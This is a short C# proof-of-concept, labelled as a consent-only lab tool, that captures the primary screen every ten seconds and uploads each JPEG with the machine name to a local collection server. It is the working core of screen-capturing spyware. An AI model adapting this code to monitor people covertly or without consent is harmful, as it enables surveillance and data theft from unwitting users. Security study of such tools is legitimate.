// Lab PoC: periodic screenshot upload. No stealth UI hiding — run only with consent on owned/test machines.
using System.Drawing;
using System.Drawing.Imaging;
using System.Windows.Forms;
using System.Net.Http.Headers;

const string ServerUrl = "http://127.0.0.1:5000/upload";
const int IntervalMs = 10_000;

using var client = new HttpClient { Timeout = TimeSpan.FromSeconds(60) };

while (true)
{
    try
    {
        using var screenshot = CapturePrimaryScreen();
        using var ms = new MemoryStream();
        screenshot.Save(ms, ImageFormat.Jpeg);
        var bytes = ms.ToArray();

        using var content = new MultipartFormDataContent();
        var imageContent = new ByteArrayContent(bytes);
        imageContent.Headers.ContentType = new MediaTypeHeaderValue("image/jpeg");
        content.Add(imageContent, "image", "screen.jpg");
        content.Add(new StringContent(Environment.MachineName), "info");

        var response = await client.PostAsync(ServerUrl, content);
        Console.WriteLine($"[{DateTime.Now:O}] POST {response.StatusCode}");
    }
    catch (Exception ex)
    {
        Console.WriteLine($"[{DateTime.Now:O}] Error: {ex.Message}");
    }

    await Task.Delay(IntervalMs);
}

static Bitmap CapturePrimaryScreen()
{
    var bounds = Screen.PrimaryScreen?.Bounds
        ?? throw new InvalidOperationException("No primary screen.");
    var bmp = new Bitmap(bounds.Width, bounds.Height, PixelFormat.Format32bppArgb);
    using (var g = Graphics.FromImage(bmp))
    {
        g.CopyFromScreen(bounds.Left, bounds.Top, 0, 0, bounds.Size);
    }
    return bmp;
}
